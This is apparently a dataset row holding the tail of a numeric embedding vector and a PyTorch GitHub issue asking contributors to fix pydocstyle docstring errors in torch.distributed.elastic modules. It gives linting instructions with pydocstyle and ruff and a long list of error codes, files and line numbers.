  3.68650854e-01  1.14757024e-01  2.02067718e-01 -3.67867425e-02
 -3.30977201e-01  6.42478108e-01 -3.63828421e-01  9.45085213e-02
  1.78784981e-01  1.94270387e-02 -2.70170718e-01 -8.16669315e-02
 -5.49140811e-01  7.21174181e-02 -7.68583938e-02  2.64111590e-02
  1.71249151e-01  2.15269655e-01  1.11472219e-01  1.21423051e-01
  1.70854643e-01  4.32752073e-02  2.96806365e-01  1.75820470e-01
 -4.35413122e-01  2.44498044e-01  6.13532141e-02  2.44687766e-01
  2.12223187e-01  2.43925780e-01 -1.57656848e-01  4.68554795e-02
  1.36264920e-01 -4.23220992e-01  3.86409819e-01  3.06968182e-01
 -2.50352442e-01  2.35864639e-01  6.05541840e-03  1.43230677e-01
  2.00423561e-02  2.56668836e-01  3.31454575e-01 -5.28855920e-02
  2.48211861e-01 -1.49038091e-01 -5.20363152e-01  3.09800617e-02
  6.25413433e-02  8.24256800e-04 -6.17581129e-01  2.44075209e-01
 -4.51052696e-01 -1.10650674e-01  2.48496532e-01  1.17652729e-01
  4.83805966e-03  5.60124479e-02 -3.94247547e-02  1.49693236e-01
 -2.07879364e-01  6.59262091e-02  4.12271777e-03 -2.26195723e-01
  8.62983763e-02 -9.43736956e-02  2.41142616e-01 -5.57614505e-01
  4.72912230e-02 -1.84218615e-01  1.29525498e-01  7.69356489e-02
 -4.52109337e-01 -1.23844787e-01  3.81645739e-01 -1.70131713e-01
 -6.59511328e-01  7.18573630e-02 -4.89867851e-02  2.24241674e-01
  6.70366585e-02  3.85279715e-01  1.72128022e-01  2.42922336e-01
 -5.22778690e-01 -1.05368257e-01 -2.18410730e-01 -3.26362610e-01
 -8.81423987e-03 -2.89083898e-01 -4.84604180e-01  1.08690336e-01
 -1.88914433e-01  2.02595726e-01 -2.88295269e-01  8.71217251e-02
 -1.61243111e-01  9.31490362e-02  4.33518767e-01  2.94176936e-01
  1.33941144e-01  5.09412354e-03 -9.47572887e-02 -3.31749916e-01
 -2.67157108e-01  4.05810714e-01  5.94518065e-01 -1.46377936e-01]"
"Fix docstring errors in etcd_server.py, etcd_rendezvous.py, api.py, __init__.py, error_handler.py, dynamic_rendezvous.py, tail_log.py, etcd_rendezvous_backend.py, redirects.py, c10d_rendezvous_backend.py, utils.py, registry.py, etcd_store.py, static_tcp_rendezvous.py module: docs triaged medium docathon-h2-2023","Please fix the following issues.
First, make sure to install the required tools:
```
pip3 install pydocstyle
```
```
pip3 install ruff
```
Then complete the followings steps:
 1. Run `pydocstyle` to see the number of errors in the file: 
 ```
pydocstyle path-to-file --count
```
 &nbsp; &nbsp; This command prints out the number of errors at the end of the output. Save this output to later add it to your PR description.
2. Next, run `ruff` which should help autofix many of these errors:
```
ruff --select RULECODE --fix path_to_file
```
&nbsp; &nbsp; `RULECODE` is the error code from the output in the issue, for example, **D200**. See the complete list of rules and autofixes [here](https://docs.astral.sh/ruff/rules/#pydocstyle-d).
3. You can run the above command with the `--unsafe-fixes` option. Double-check that the applied fixes are correct.
4. Fix the remaining issues. Fix **only** the errors listed in the issue. Skip the 'Missing docstrings' errors.
5. Run pydocstyle again:
```
pydocstyle path-to-file --count
```
This **number might not be 0** which is **OK**. Add the count of fixed errors to your PR description. 
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/events/__init__.py`, **Entity**: `_get_or_create_logger`, **Line**: 43, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/events/__init__.py`, **Entity**: `_get_or_create_logger`, **Line**: 43, **Description**: First line should be in imperative mood (perhaps 'Construct', not 'Constructs')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/events/api.py`, **Entity**: `EventSource`, **Line**: 20, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/events/api.py`, **Entity**: `Event`, **Line**: 30, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/events/api.py`, **Entity**: `Event`, **Line**: 30, **Description**: First line should end with a period (not 'c')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/events/api.py`, **Entity**: `NodeState`, **Line**: 63, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/metrics/__init__.py`, **Entity**: ``, **Line**: 9, **Description**: First line should end with a period (not 'I')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/metrics/api.py`, **Entity**: `prof`, **Line**: 103, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/metrics/api.py`, **Entity**: `prof`, **Line**: 103, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/metrics/api.py`, **Entity**: `put_metric`, **Line**: 183, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/metrics/api.py`, **Entity**: `put_metric`, **Line**: 183, **Description**: First line should be in imperative mood (perhaps 'Publish', not 'Publishes')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/metrics/api.py`, **Entity**: `get_elapsed_time_ms`, **Line**: 206, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/metrics/api.py`, **Entity**: `get_elapsed_time_ms`, **Line**: 206, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/__init__.py`, **Entity**: ``, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/__init__.py`, **Entity**: ``, **Line**: 9, **Description**: First line should end with a period (not 's')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/multiprocessing/__init__.py`, **Entity**: `start_processes`, **Line**: 95, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/__init__.py`, **Entity**: `start_processes`, **Line**: 95, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/__init__.py`, **Entity**: `start_processes`, **Line**: 95, **Description**: First line should be in imperative mood (perhaps 'Start', not 'Starts')
- **Error Code**: **D412**, **File**: `torch/distributed/elastic/multiprocessing/__init__.py`, **Entity**: `start_processes`, **Line**: 95, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `SignalException`, **Line**: 42, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `SignalException`, **Line**: 42, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `_get_kill_signal`, **Line**: 66, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `_get_default_signal`, **Line**: 76, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `from_str`, **Line**: 108, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `from_str`, **Line**: 108, **Description**: First line should be in imperative mood; try rephrasing (found 'Example')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `to_map`, **Line**: 143, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `to_map`, **Line**: 143, **Description**: First line should end with a period (not 'l')
- **Error Code**: **D412**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `to_map`, **Line**: 143, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `RunProcsResult`, **Line**: 167, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `PContext`, **Line**: 190, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `PContext`, **Line**: 190, **Description**: First line should end with a period (not 's')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `start`, **Line**: 231, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `_start`, **Line**: 245, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `_poll`, **Line**: 252, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `_poll`, **Line**: 252, **Description**: First line should be in imperative mood (perhaps 'Poll', not 'Polls')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `wait`, **Line**: 262, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `wait`, **Line**: 262, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `wait`, **Line**: 262, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `wait`, **Line**: 262, **Description**: First line should be in imperative mood (perhaps 'Wait', not 'Waits')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `pids`, **Line**: 304, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `pids`, **Line**: 304, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `pids`, **Line**: 304, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `_close`, **Line**: 311, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `_close`, **Line**: 311, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `close`, **Line**: 320, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `close`, **Line**: 320, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `MultiprocessContext`, **Line**: 376, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `SubprocessHandler`, **Line**: 555, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `SubprocessHandler`, **Line**: 555, **Description**: First line should end with a period (not 'f')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/api.py`, **Entity**: `SubprocessContext`, **Line**: 599, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/multiprocessing/redirects.py`, **Entity**: `redirect`, **Line**: 51, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/redirects.py`, **Entity**: `redirect`, **Line**: 51, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/redirects.py`, **Entity**: `redirect`, **Line**: 51, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/tail_log.py`, **Entity**: `TailLog`, **Line**: 48, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/tail_log.py`, **Entity**: `TailLog`, **Line**: 48, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: ``, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: ``, **Line**: 9, **Description**: First line should end with a period (not ',')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `ProcessFailure`, **Line**: 83, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `ProcessFailure`, **Line**: 83, **Description**: First line should end with a period (not ',')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `timestamp_isoformat`, **Line**: 158, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `timestamp_isoformat`, **Line**: 158, **Description**: First line should end with a period (not ')')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `timestamp_isoformat`, **Line**: 158, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `ChildFailedError`, **Line**: 188, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `ChildFailedError`, **Line**: 188, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D412**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `ChildFailedError`, **Line**: 188, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `record`, **Line**: 301, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `record`, **Line**: 301, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `record`, **Line**: 301, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D412**, **File**: `torch/distributed/elastic/multiprocessing/errors/__init__.py`, **Entity**: `record`, **Line**: 301, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `ErrorHandler`, **Line**: 23, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `ErrorHandler`, **Line**: 23, **Description**: First line should end with a period (not 't')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `_get_error_file_path`, **Line**: 35, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `_get_error_file_path`, **Line**: 35, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `_get_error_file_path`, **Line**: 35, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `initialize`, **Line**: 42, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `initialize`, **Line**: 42, **Description**: First line should be in imperative mood (perhaps 'Call', not 'Called')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `_write_error_file`, **Line**: 54, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `_write_error_file`, **Line**: 54, **Description**: First line should be in imperative mood (perhaps 'Write', not 'Writes')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `record_exception`, **Line**: 64, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `record_exception`, **Line**: 64, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `record_exception`, **Line**: 64, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `record_exception`, **Line**: 64, **Description**: First line should be in imperative mood (perhaps 'Write', not 'Writes')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `override_error_code_in_rootcause_data`, **Line**: 90, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `dump_error_file`, **Line**: 109, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/multiprocessing/errors/error_handler.py`, **Entity**: `dump_error_file`, **Line**: 109, **Description**: First line should be in imperative mood (perhaps 'Dump', not 'Dumps')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_store.py`, **Entity**: `EtcdStore`, **Line**: 27, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_store.py`, **Entity**: `EtcdStore`, **Line**: 27, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_store.py`, **Entity**: `set`, **Line**: 51, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_store.py`, **Entity**: `add`, **Line**: 80, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_store.py`, **Entity**: `add`, **Line**: 80, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_store.py`, **Entity**: `wait`, **Line**: 117, **Description**: First line should be in imperative mood (perhaps 'Wait', not 'Waits')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/rendezvous/etcd_store.py`, **Entity**: `check`, **Line**: 130, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/__init__.py`, **Entity**: ``, **Line**: 7, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/__init__.py`, **Entity**: ``, **Line**: 7, **Description**: First line should end with a period (not 'o')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous_backend.py`, **Entity**: `create_backend`, **Line**: 186, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous_backend.py`, **Entity**: `create_backend`, **Line**: 186, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous_backend.py`, **Entity**: `create_backend`, **Line**: 186, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/c10d_rendezvous_backend.py`, **Entity**: `create_backend`, **Line**: 207, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/c10d_rendezvous_backend.py`, **Entity**: `create_backend`, **Line**: 207, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/c10d_rendezvous_backend.py`, **Entity**: `create_backend`, **Line**: 207, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/registry.py`, **Entity**: `get_rendezvous_handler`, **Line**: 49, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/registry.py`, **Entity**: `get_rendezvous_handler`, **Line**: 49, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `get_state`, **Line**: 61, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `set_state`, **Line**: 78, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `sync`, **Line**: 322, **Description**: First line should be in imperative mood (perhaps 'Read', not 'Reads')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `mark_dirty`, **Line**: 331, **Description**: First line should be in imperative mood (perhaps 'Mark', not 'Marks')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `run`, **Line**: 540, **Description**: First line should be in imperative mood (perhaps 'Execute', not 'Executes')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `_should_keep_alive`, **Line**: 771, **Description**: First line should be in imperative mood (perhaps 'Determine', not 'Determines')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `from_backend`, **Line**: 904, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `create_handler`, **Line**: 1204, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `create_handler`, **Line**: 1204, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/dynamic_rendezvous.py`, **Entity**: `create_handler`, **Line**: 1204, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `EtcdRendezvousHandler`, **Line**: 78, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `EtcdRendezvousHandler`, **Line**: 78, **Description**: First line should end with a period (not 'a')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `EtcdRendezvous`, **Line**: 198, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `EtcdRendezvous`, **Line**: 198, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `rendezvous_barrier`, **Line**: 260, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `rendezvous_barrier`, **Line**: 260, **Description**: First line should be in imperative mood; try rephrasing (found 'Main')
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `init_phase`, **Line**: 317, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `init_phase`, **Line**: 317, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initially')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `join_phase`, **Line**: 359, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `join_phase`, **Line**: 359, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `join_phase`, **Line**: 359, **Description**: First line should end with a period (not 's')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `confirm_phase`, **Line**: 399, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `confirm_phase`, **Line**: 399, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `confirm_phase`, **Line**: 399, **Description**: First line should end with a period (not ',')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `handle_existing_rendezvous`, **Line**: 422, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `handle_existing_rendezvous`, **Line**: 422, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `handle_existing_rendezvous`, **Line**: 422, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `try_create_rendezvous`, **Line**: 442, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `try_create_rendezvous`, **Line**: 442, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `try_create_rendezvous`, **Line**: 442, **Description**: First line should end with a period (not 's')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `join_rendezvous`, **Line**: 497, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `join_rendezvous`, **Line**: 497, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `join_rendezvous`, **Line**: 497, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `wait_for_peers`, **Line**: 549, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `wait_for_peers`, **Line**: 549, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `confirm_membership`, **Line**: 571, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `confirm_membership`, **Line**: 571, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `confirm_membership`, **Line**: 571, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `confirm_membership`, **Line**: 571, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `wait_for_final`, **Line**: 622, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `wait_for_final`, **Line**: 622, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `wait_for_final`, **Line**: 622, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `announce_self_waiting`, **Line**: 644, **Description**: No blank lines allowed after function docstring (found 1)
